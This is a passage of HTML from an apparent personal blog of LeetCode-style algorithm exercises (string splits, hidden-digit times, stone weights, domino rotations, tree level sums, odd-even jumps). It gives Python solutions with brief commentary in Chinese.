class="keyword">import</span> defaultdict</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">numSplits</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        left = defaultdict(<span class="built_in">int</span>)</span><br><span class="line">        right = defaultdict(<span class="built_in">int</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            right[i] += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            left[i] += <span class="number">1</span></span><br><span class="line">            right[i] -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> right[i] == <span class="number">0</span>:</span><br><span class="line">                right.pop(i)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(left.keys()) == <span class="built_in">len</span>(right.keys()):</span><br><span class="line">                res += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure></p><h2 id="latest-time-by-replacing-hidden-digits">1736. Latest Time by Replacing Hidden Digits</h2><p>You are given a string <code>time</code> in the form of <code>hh:mm</code>, where some of the digits in the string are hidden (represented by <code>?</code>).</p><p>The valid times are those inclusively between <code>00:00</code> and <code>23:59</code>.</p><p>Return the latest valid time you can get from <code>time</code> by replacing the hidden digits.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: time = &quot;2?:?0&quot;</span><br><span class="line">Output: &quot;23:50&quot;</span><br><span class="line">Explanation: The latest hour beginning with the digit &#x27;2&#x27; is 23 and the latest minute ending with the digit &#x27;0&#x27; is 50.</span><br></pre></td></tr></table></figure><p>逻辑题 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">maximumTime</span>(<span class="params">self, time: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        res = <span class="built_in">list</span>(time)</span><br><span class="line">        <span class="keyword">if</span> res[<span class="number">0</span>] == <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> res[<span class="number">1</span>] == <span class="string">&#x27;?&#x27;</span> <span class="keyword">or</span> <span class="built_in">int</span>(res[<span class="number">1</span>]) &lt; <span class="number">4</span>:</span><br><span class="line">                res[<span class="number">0</span>] = <span class="string">&#x27;2&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res[<span class="number">0</span>] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> res[<span class="number">1</span>] == <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> res[<span class="number">0</span>] == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">                res[<span class="number">1</span>] = <span class="string">&#x27;3&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res[<span class="number">1</span>] = <span class="string">&#x27;9&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> res[<span class="number">3</span>] == <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">            res[<span class="number">3</span>] = <span class="string">&#x27;5&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> res[<span class="number">4</span>] == <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">            res[<span class="number">4</span>] = <span class="string">&#x27;9&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(res)                  </span><br></pre></td></tr></table></figure></p><h2 id="last-stone-weight-ii">1049. Last Stone Weight II</h2><p>You are given an array of integers stones where <code>stones[i]</code> is the weight of the ith stone.</p><p>We are playing a game with the stones. On each turn, we choose any two stones and smash them together. Suppose the stones have weights <code>x</code> and <code>y</code> with <code>x &lt;= y</code>. The result of this smash is:</p><p>If <code>x == y</code>, both stones are destroyed, and If <code>x != y</code>, the stone of weight <code>x</code> is destroyed, and the stone of weight <code>y</code> has new weight <code>y - x</code>. At the end of the game, there is at most one stone left.</p><p>Return the smallest possible weight of the left stone. If there are no stones left, return 0.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: stones = [2,7,4,1,8,1]</span><br><span class="line">Output: 1</span><br><span class="line">Explanation:</span><br><span class="line">We can combine 2 and 4 to get 2, so the array converts to [2,7,1,8,1] then,</span><br><span class="line">we can combine 7 and 8 to get 1, so the array converts to [2,1,1,1] then,</span><br><span class="line">we can combine 2 and 1 to get 1, so the array converts to [1,1,1] then,</span><br><span class="line">we can combine 1 and 1 to get 0, so the array converts to [1], then that&#x27;s the optimal value.</span><br></pre></td></tr></table></figure><p>01背包,target为 0.5 * sum(stones) <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lastStoneWeightII</span>(<span class="params">self, stones: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        sum_ = <span class="built_in">sum</span>(stones)</span><br><span class="line">        target = sum_ // <span class="number">2</span></span><br><span class="line">        dp = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(target+<span class="number">1</span>)]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> stones:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(target, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> j &gt;= i:</span><br><span class="line">                    dp[j] = <span class="built_in">max</span>(dp[j], dp[j-i]+i)</span><br><span class="line">        <span class="keyword">return</span> sum_ - <span class="number">2</span> * dp[-<span class="number">1</span>]</span><br></pre></td></tr></table></figure></p><h2 id="most-booked-hotel-room">Most Booked Hotel Room</h2><p>Given a hotel which has 10 floors <code>[0-9]</code> and each floor has 26 rooms <code>[A-Z]</code>. You are given a sequence of rooms, where <code>+</code> suggests room is booked, <code>-</code> room is freed. You have to find which room is booked maximum number of times.</p><p>You may assume that the list describe a correct sequence of bookings in chronological order; that is, only free rooms can be booked and only booked rooms can be freeed. All rooms are initially free. Note that this does not mean that all rooms have to be free at the end. In case, 2 rooms have been booked the same number of times, return the lexographically smaller room.</p><p>You may assume:</p><ul><li><code>N</code> (length of input) is an integer within the range <code>[1, 600]</code></li><li>each element of array A is a string consisting of three characters: "+" or "-"; a digit "0"-"9"; and uppercase English letter "A" - "Z"</li><li>the sequence is correct. That is every booked room was previously free and every freed room was previously booked.</li></ul><p>counter加个sort <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">most_booked</span>(<span class="params">lst</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sorted</span>(Counter(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x[<span class="number">0</span>]==<span class="string">&#x27;+&#x27;</span>, lst)).items(), key=<span class="keyword">lambda</span> y: (-y[-<span class="number">1</span>], -<span class="built_in">ord</span>(y[<span class="number">0</span>][-<span class="number">1</span>])))[<span class="number">0</span>][<span class="number">0</span>]</span><br></pre></td></tr></table></figure></p><h2 id="minimum-domino-rotations-for-equal-row">1007. Minimum Domino Rotations For Equal Row</h2><p>In a row of dominoes, <code>tops[i]</code> and <code>bottoms[i]</code> represent the top and bottom halves of the <code>i</code>th domino. (A domino is a tile with two numbers from 1 to 6 - one on each half of the tile.)</p><p>We may rotate the <code>i</code>th domino, so that <code>tops[i]</code> and <code>bottoms[i]</code> swap values.</p><p>Return the minimum number of rotations so that all the values in tops are the same, or all the values in bottoms are the same.</p><p>If it cannot be done, return -1. <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input: tops = [2,1,2,4,2,2], bottoms = [5,2,6,2,3,2]</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: </span><br><span class="line">The first figure represents the dominoes as given by tops and bottoms: before we do any rotations.</span><br><span class="line">If we rotate the second and fourth dominoes, we can make every value in the top row equal to 2, as indicated by the second figure.</span><br></pre></td></tr></table></figure></p><p>一开始用的bit_mask遍历复杂幂函数TLE,后续考虑统计频率然后遍历AC <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">minDominoRotations</span>(<span class="params">self, tops: <span class="type">List</span>[<span class="built_in">int</span>], bottoms: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">set</span>(tops)) &lt;= <span class="number">1</span> <span class="keyword">or</span> <span class="built_in">len</span>(<span class="built_in">set</span>(bottoms)) &lt;= <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        ctr_top = Counter(tops)</span><br><span class="line">        ctr_btm = Counter(bottoms)</span><br><span class="line">        sorted_ctr = <span class="built_in">sorted</span>(<span class="built_in">list</span>(ctr_top.items())+<span class="built_in">list</span>(ctr_btm.items()), key=<span class="keyword">lambda</span> x: -x[<span class="number">1</span>])</span><br><span class="line">        solution = <span class="built_in">len</span>(tops)</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> sorted_ctr:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tops)):</span><br><span class="line">                <span class="keyword">if</span> tops[i] != k <span class="keyword">and</span> bottoms[i] != k:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">elif</span> i == <span class="built_in">len</span>(tops) - <span class="number">1</span>:</span><br><span class="line">                    res = <span class="built_in">min</span>(v, <span class="built_in">len</span>(tops)-v)</span><br><span class="line">                    solution = solution <span class="keyword">if</span> solution &lt; res <span class="keyword">else</span> res</span><br><span class="line">        <span class="keyword">if</span> solution == <span class="built_in">len</span>(tops):</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> solution</span><br></pre></td></tr></table></figure> 看了下其他人的solution,贴一个简洁的代码 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">minDominoRotations</span>(<span class="params">self, tops: <span class="type">List</span>[<span class="built_in">int</span>], bottoms: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> [tops[<span class="number">0</span>], bottoms[<span class="number">0</span>]]:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">all</span>(x <span class="keyword">in</span> lst <span class="keyword">for</span> lst <span class="keyword">in</span> <span class="built_in">zip</span>(tops,bottoms)):</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">len</span>(tops) - <span class="built_in">max</span>(tops.count(x), bottoms.count(x))</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br></pre></td></tr></table></figure></p><p>主要思路 <code>top[0]</code> 或 <code>bottom[0]</code> 必须包含在成立结果中</p><h2 id="single-row-keyboard">1165. Single-Row Keyboard</h2><p>Imagine you have a special keyboard with all keys in a single row. The layout of characters on a keyboard is denoted by a string <code>keyboard</code> of length 26. Initially your finger is at index 0. To type a character, you have to move your finger to the index of the desired character. The time taken to move your finger from index <code>i</code> to index <code>j</code> is <code>abs(j - i)</code>.</p><p>Given a string <code>keyboard</code> that describe the keyboard layout and a string <code>text</code>, return an integer denoting the time taken to type string <code>text</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: keyboard = &quot;abcdefghijklmnopqrstuvwxy&quot;, text = &quot;cba&quot; </span><br><span class="line">Output: 4</span><br><span class="line">Explanation:</span><br><span class="line">Initially your finger is at index 0. First you have to type &#x27;c&#x27;. The time taken to type &#x27;c&#x27; will be abs(2 - 0) = 2 because character &#x27;c&#x27; is at index 2.</span><br><span class="line">The second character is &#x27;b&#x27; and your finger is now at index 2. The time taken to type &#x27;b&#x27; will be abs(1 - 2) = 1 because character &#x27;b&#x27; is at index 1.</span><br><span class="line">The third character is &#x27;a&#x27; and your finger is now at index 1. The time taken to type &#x27;a&#x27; will be abs(0 - 1) = 1 because character &#x27;a&#x27; is at index 0.</span><br><span class="line">The total time will therefore be 2 + 1 + 1 = 4.</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fn</span>(<span class="params">self, keyboard, text</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        curr = <span class="number">0</span></span><br><span class="line">        key_map = <span class="built_in">dict</span>()</span><br><span class="line">        <span class="keyword">for</span> index, key <span class="keyword">in</span> <span class="built_in">enumerate</span>(keyboard):</span><br><span class="line">            key_map[key] = index</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">            v = key_map[char]</span><br><span class="line">            res += <span class="built_in">abs</span>(v - curr)</span><br><span class="line">            curr = v</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h2 id="maximum-level-sum-of-a-binary-tree">1161. Maximum Level Sum of a Binary Tree</h2><p>Given the root of a binary tree, the level of its root is 1, the level of its children is 2, and so on.</p><p>Return the <code>smallest</code> level x such that the sum of all the values of nodes at level x is <code>maximal</code>.</p><p><img src="MaxLevelBinTree.jpeg" alt="blacsheep" /> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: root = [1,7,0,7,-8,null,null]</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: </span><br><span class="line">Level 1 sum = 1.</span><br><span class="line">Level 2 sum = 7 + 0 = 7.</span><br><span class="line">Level 3 sum = 7 + -8 = -1.</span><br><span class="line">So we return the level with the maximum sum which is level 2.</span><br></pre></td></tr></table></figure></p><p>bfs即可 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">maxLevelSum</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        level = <span class="number">0</span></span><br><span class="line">        parent = []</span><br><span class="line">        child = [root]</span><br><span class="line">        dict_ = &#123;&#125;</span><br><span class="line">        <span class="keyword">while</span> child:</span><br><span class="line">            level += <span class="number">1</span></span><br><span class="line">            parent = child</span><br><span class="line">            child = []</span><br><span class="line">            level_sum = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> node <span class="keyword">in</span> parent:</span><br><span class="line">                <span class="keyword">if</span> node.left:</span><br><span class="line">                    child.append(node.left)</span><br><span class="line">                <span class="keyword">if</span> node.right:</span><br><span class="line">                    child.append(node.right)</span><br><span class="line">                level_sum += node.val</span><br><span class="line">            dict_[level] = level_sum</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sorted</span>(dict_.items(), key=<span class="keyword">lambda</span> x: (-x[<span class="number">1</span>],x[<span class="number">0</span>]))[<span class="number">0</span>][<span class="number">0</span>]</span><br></pre></td></tr></table></figure></p><h2 id="hotel-bookings-possible">Hotel Bookings Possible</h2><p>A hotel manager has to process <code>N</code> advance bookings of rooms for the next season. His hotel has <code>C</code> rooms. Bookings contain an <code>arrival</code> date and a <code>departure</code> date. He wants to find out whether there are enough rooms in the hotel to satisfy the demand. Write a program that solves this problem in time <code>O(NlogN)</code>.</p><p>Note-If we have <code>arrival</code> and <code>departure</code> on the same date then arrival must be served before the departure.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Input 1:</span><br><span class="line">A = [1, 3, 5]</span><br><span class="line">B = [2, 6, 8]</span><br><span class="line">C = 1</span><br><span class="line"># output: 0</span><br><span class="line"></span><br><span class="line">A = [1, 2, 3]</span><br><span class="line">B = [2, 3, 4]</span><br><span class="line">C = 2</span><br><span class="line"># output: 1</span><br></pre></td></tr></table></figure><p>排序, 指针扫一遍即可 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="comment"># @param arrive : list of integers</span></span><br><span class="line">    <span class="comment"># @param depart : list of integers</span></span><br><span class="line">    <span class="comment"># @param K : integer</span></span><br><span class="line">    <span class="comment"># @return a boolean</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hotel</span>(<span class="params">self, arrive, depart, K</span>):</span><br><span class="line">        arrive = <span class="built_in">sorted</span>(arrive)</span><br><span class="line">        depart = <span class="built_in">sorted</span>(depart)</span><br><span class="line">        people = <span class="number">0</span></span><br><span class="line">        chair = <span class="number">0</span></span><br><span class="line">        i_index = <span class="number">0</span></span><br><span class="line">        o_index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> o_index &lt; <span class="built_in">len</span>(depart):</span><br><span class="line">            <span class="keyword">while</span> arrive[i_index] &lt;= depart[o_index]:</span><br><span class="line">                people += <span class="number">1</span></span><br><span class="line">                i_index += <span class="number">1</span></span><br><span class="line">                chair = <span class="built_in">max</span>(chair, people)</span><br><span class="line">                <span class="keyword">if</span> i_index == <span class="built_in">len</span>(arrive):</span><br><span class="line">                    <span class="keyword">return</span> chair &lt;= K</span><br><span class="line">            o_index += <span class="number">1</span></span><br><span class="line">            people -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> chair &lt;= K</span><br></pre></td></tr></table></figure></p><h2 id="k-closest-points-to-origin">973. K Closest Points to Origin</h2><p>Given an array of points where <code>points[i] = [x_i, y_i]</code> represents a point on the X-Y plane and an integer <code>k</code>, return the <code>k</code> closest points to the origin <code>(0, 0)</code>.</p><p>The distance between two points on the X-Y plane is the Euclidean distance (i.e., √(x1 - x2)^2 + (y1 - y2)^2).</p><p>You may return the answer in any order. The answer is guaranteed to be unique (except for the order that it is in).</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: points = [[3,3],[5,-1],[-2,4]], k = 2</span><br><span class="line">Output: [[3,3],[-2,4]]</span><br><span class="line">Explanation: The answer [[-2,4],[3,3]] would also be accepted.</span><br></pre></td></tr></table></figure><p>经典KNN <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">kClosest</span>(<span class="params">self, points: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]], k: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">sorted</span>(points, key=<span class="keyword">lambda</span> x: x[<span class="number">0</span>]*x[<span class="number">0</span>] + x[<span class="number">1</span>]*x[<span class="number">1</span>]))[:k]</span><br></pre></td></tr></table></figure></p><h2 id="odd-even-jump">975. Odd Even Jump</h2><p>You are given an integer array <code>arr</code>. From some starting index, you can make a series of jumps. The (1st, 3rd, 5th, ...) jumps in the series are called odd-numbered jumps, and the (2nd, 4th, 6th, ...) jumps in the series are called even-numbered jumps. Note that the jumps are numbered, not the indices.</p><p>You may jump forward from index <code>i</code> to index <code>j</code> (with <code>i &lt; j</code>) in the following way:</p><p>During odd-numbered jumps (i.e., jumps 1, 3, 5, ...), you jump to the index <code>j</code> such that <code>arr[i] &lt;= arr[j]</code> and <code>arr[j]</code> is the smallest possible value. If there are multiple such indices <code>j</code>, you can only jump to the smallest such index <code>j</code>. During even-numbered jumps (i.e., jumps 2, 4, 6, ...), you jump to the index <code>j</code> such that <code>arr[i] &gt;= arr[j]</code> and <code>arr[j]</code> is the largest possible value. If there are multiple such indices <code>j</code>, you can only jump to the smallest such index <code>j</code>. It may be the case that for some index <code>i</code>, there are no legal jumps. A starting index is good if, starting from that index, you can reach the end of the array (index <code>arr.length - 1</code>) by jumping some number of times (possibly 0 or more than once).</p><p>Return the number of good starting indices.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input: arr = [10,13,12,14,15]</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: </span><br><span class="line">From starting index i = 0, we can make our 1st jump to i = 2 (since arr[2] is the smallest among arr[1], arr[2], arr[3], arr[4] that is greater or equal to arr[0]), then we cannot jump any more.</span><br><span class="line">From starting index i = 1 and i = 2, we can make our 1st jump to i = 3, then we cannot jump any more.</span><br><span class="line">From starting index i = 3, we can make our 1st jump to i = 4, so we have reached the end.</span><br><span class="line">From starting index i = 4, we have reached the end already.</span><br><span class="line">In total, there are 2 different starting indices i = 3 and i = 4, where we can reach the end with some number of jumps.</span><br></pre></td></tr></table></figure><p>描述挺复杂的,但说人话就是永远从左往右跳,奇数跳跳大于等于自己的,偶数跳跳小于等于自己的,永远跳绝对值和自己差最小的,并且有相同值跳近的.</p><p>第一感觉可以从后向前推, 只要最后把奇数跳起步的能满足的加起来就行,同时维护一个偶数跳dp组用来更快捷的判断. 但是可惜并没有写出来,选择了比较笨的从前往后推.</p><p>遍历<code>arr</code>,把<code>index</code>和<code>value</code>丢字典,然后维护一个<code>key_set</code>. 非常笨,优化也不太行.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">oddEvenJumps</span>(<span class="params">self, arr: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        dict_arr = defaultdict(<span class="built_in">list</span>)</span><br><span class="line">        key = <span class="built_in">sorted</span>(<span class="built_in">list</span>(<span class="built_in">set</span>(arr)))</span><br><span class="line">        res_list = [[<span class="number">1</span>, <span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arr))]</span><br><span class="line">        <span class="keyword">for</span> index, value <span class="keyword">in</span> <span class="built_in">enumerate</span>(arr):</span><br><span class="line">            dict_arr[value].append(index)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> index, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(arr):</span><br><span class="line">            <span class="comment"># same item exist</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(dict_arr[v]) &gt; <span class="number">1</span>:</span><br><span class="line">                same_item_index = dict_arr[v][<span class="number">1</span>]</span><br><span class="line">                res_list[same_item_index][<span class="number">0</span>] += res_list[index][<span class="number">1</span>]</span><br><span class="line">                res_list[same_item_index][<span class="number">1</span>] += res_list[index][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                v_index = bisect.bisect_left(key, v)</span><br><span class="line">                lower_v = key[v_index-<span class="number">1</span>] <span class="keyword">if</span> v_index &gt;= <span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">                upper_v = key[v_index+<span class="number">1</span>] <span class="keyword">if</span> v_index &lt;= <span class="built_in">len</span>(key)-<span class="number">2</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">                <span class="keyword">if</span> lower_v:</span><br><span class="line">                    lower_index = dict_arr[lower_v][<span class="number">0</span>]</span><br><span class="line">                    res_list[lower_index][<span class="number">0</span>] += res_list[index][<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">if</span> upper_v:</span><br><span class="line">                    upper_index = dict_arr[upper_v][<span class="number">0</span>]</span><br><span class="line">                    res_list[upper_index][<span class="number">1</span>] += res_list[index][<span class="number">0</span>]</span><br><span class="line">            dict_arr[v].pop(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> dict_arr[v]:</span><br><span class="line">                key.pop(v_index)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sum</span>(res_list[-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>后续看了下别人的代码,发现可以用栈来处理 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 